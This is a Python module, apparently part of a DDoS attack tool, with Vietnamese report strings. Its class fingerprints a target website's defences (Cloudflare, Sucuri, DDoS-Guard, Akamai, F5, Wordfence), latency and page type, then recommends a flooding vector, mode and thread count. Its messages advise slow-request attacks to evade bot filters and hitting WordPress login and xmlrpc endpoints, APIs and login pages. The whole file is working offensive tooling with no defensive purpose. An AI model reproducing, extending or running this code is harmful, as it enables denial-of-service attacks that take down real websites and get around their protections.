import re
import config

class AIAnalyzer:
    def __init__(self, target_info, response_obj):
        self.target_info = target_info
        self.response = response_obj
        self.plan = {
            "vector": "HTTP Matrix",
            "vector_id": "1",
            "mode": "Saturation",
            "threads": config.DEFAULT_THREADS["Saturation"],
            "threat_level": "Thấp",
            "summary_report": "Không phát hiện lớp bảo vệ đặc biệt. Đề xuất tấn công bão hòa tiêu chuẩn."
        }

    def generate_plan(self):
        self.analyze_protection()
        self.analyze_latency()
        self.analyze_content()
        return self.plan

    def analyze_protection(self):
        headers = {k.lower(): v for k, v in getattr(self.response, "headers", {}).items()}
        content = getattr(self.response, "text", "").lower()

        if "cloudflare" in headers.get("server", "") or "cf-ray" in headers or "cloudflare" in content:
            self.plan["threat_level"] = "Trung bình"
            if any(k in headers for k in ["cf-mitigated", "cf-chl-bypass"]):
                self.plan["vector"] = "Slow Pipe"
                self.plan["vector_id"] = "2"
                self.plan["mode"] = "Saturation"
                self.plan["summary_report"] = "Cloudflare bật chế độ bảo vệ cao. Đề xuất Slow Pipe để vượt thử thách/challenge."
            else:
                self.plan["vector"] = "HTTP Matrix"
                self.plan["vector_id"] = "1"
                self.plan["mode"] = "Guerilla"
                self.plan["summary_report"] = "Phát hiện Cloudflare. Đề xuất tấn công nhanh, rải rác để tránh bị block."
            self.plan["threads"] = config.DEFAULT_THREADS[self.plan["mode"]]
            return

        if "sucuri" in headers.get("x-sucuri-id", "") or "sucuri" in headers.get("server", "") or "sucuri" in content:
            self.plan["threat_level"] = "Cao"
            self.plan["vector"] = "Annihilation"
            self.plan["vector_id"] = "3"
            self.plan["mode"] = "Annihilation"
            self.plan["threads"] = config.DEFAULT_THREADS["Annihilation"]
            self.plan["summary_report"] = "Phát hiện Sucuri. Đề xuất tăng số luồng tối đa để vượt cache và lọc."
            return

        if "ddos-guard" in headers.get("server", "") or "ddos-guard" in content:
            self.plan["threat_level"] = "Cao"
            self.plan["vector"] = "Slow Pipe"
            self.plan["vector_id"] = "2"
            self.plan["mode"] = "Saturation"
            self.plan["threads"] = config.DEFAULT_THREADS["Saturation"]
            self.plan["summary_report"] = "DDoS-Guard phát hiện. Đề xuất Slow Pipe để né bot-filter, giảm tỉ lệ block cứng."
            return

        if "akamai" in headers.get("server", "") or "akamai" in content:
            self.plan["threat_level"] = "Cao"
            self.plan["vector"] = "HTTP Matrix"
            self.plan["vector_id"] = "1"
            self.plan["mode"] = "Saturation"
            self.plan["threads"] = config.DEFAULT_THREADS["Saturation"]
            self.plan["summary_report"] = "Akamai phát hiện. Đề xuất HTTP Matrix, kết hợp fake header và proxy mạnh."
            return

        if "f5" in headers.get("server", "").lower() or "big-ip" in content:
            self.plan["threat_level"] = "Cao"
            self.plan["vector"] = "HTTP Matrix"
            self.plan["vector_id"] = "1"
            self.plan["mode"] = "Saturation"
            self.plan["threads"] = config.DEFAULT_THREADS["Saturation"]
            self.plan["summary_report"] = "F5/BIG-IP phát hiện. Đề xuất HTTP Matrix với proxy tốt và luồng lớn."
            return

        if "wordfence" in content or "waf" in headers.get("server", "") or "waf" in headers.get("x-powered-by", ""):
            self.plan["threat_level"] = "Trung bình"
            self.plan["vector"] = "Slow Pipe"
            self.plan["vector_id"] = "2"
            self.plan["mode"] = "Guerilla"
            self.plan["threads"] = config.DEFAULT_THREADS["Guerilla"]
            self.plan["summary_report"] = "Phát hiện Wordfence/WAF. Đề xuất Slow Pipe, tránh block nhanh."
            return

        if "cdn" in headers.get("server", "") or "cdn" in content:
            self.plan["threat_level"] = "Thấp-Trung bình"
            self.plan["vector"] = "HTTP Matrix"
            self.plan["vector_id"] = "1"
            self.plan["mode"] = "Guerilla"
            self.plan["threads"] = config.DEFAULT_THREADS["Guerilla"]
            self.plan["summary_report"] = "Có CDN. Đề xuất tấn công rải rác, tránh tăng traffic đột ngột."
            return

    def analyze_latency(self):
        try:
            latency_str = str(self.target_info.get("Độ trễ TB", "0 ms")).split()[0]
            latency = float(latency_str)
            if latency > 800:
                self.plan["threat_level"] = "Rất cao"
                self.plan["vector"] = "Slow Pipe"
                self.plan["vector_id"] = "2"
                self.plan["mode"] = "Saturation"
                self.plan["threads"] = int(config.DEFAULT_THREADS["Saturation"] / 2)
                self.plan["summary_report"] = "Độ trễ cực cao, máy chủ có thể quá tải hoặc đã bị rate-limit. Slow Pipe cực kỳ hiệu quả."
        except Exception:
            pass

    def analyze_content(self):
        content = getattr(self.response, "text", "").lower()
        url = getattr(self.response, "url", "")

        if re.search(r'<meta name="generator" content="wordpress', content):
            self.plan["threat_level"] = "Thấp-Trung bình"
            self.plan["vector"] = "HTTP Matrix"
            self.plan["vector_id"] = "1"
            self.plan["mode"] = "Saturation"
            self.plan["threads"] = config.DEFAULT_THREADS["Saturation"]
            self.plan["summary_report"] = "Website WordPress. Đề xuất HTTP Matrix tập trung vào xmlrpc.php và wp-login.php."
            return

        if "/api/" in url or "/api/" in content:
            self.plan["threat_level"] = "Trung bình-Cao"
            self.plan["vector"] = "Slow Pipe"
            self.plan["vector_id"] = "2"
            self.plan["mode"] = "Saturation"
            self.plan["threads"] = config.DEFAULT_THREADS["Saturation"]
            self.plan["summary_report"] = "Đích đến là API. Slow Pipe giúp tăng tải mà khó bị phát hiện."
            return

        if "login" in url or "login" in content:
            self.plan["threat_level"] = "Trung bình"
            self.plan["vector"] = "Annihilation"
            self.plan["vector_id"] = "3"
            self.plan["mode"] = "Annihilation"
            self.plan["threads"] = config.DEFAULT_THREADS["Annihilation"]
            self.plan["summary_report"] = "Phát hiện trang đăng nhập. Đề xuất Annihilation để ép tài nguyên xác thực."
            return
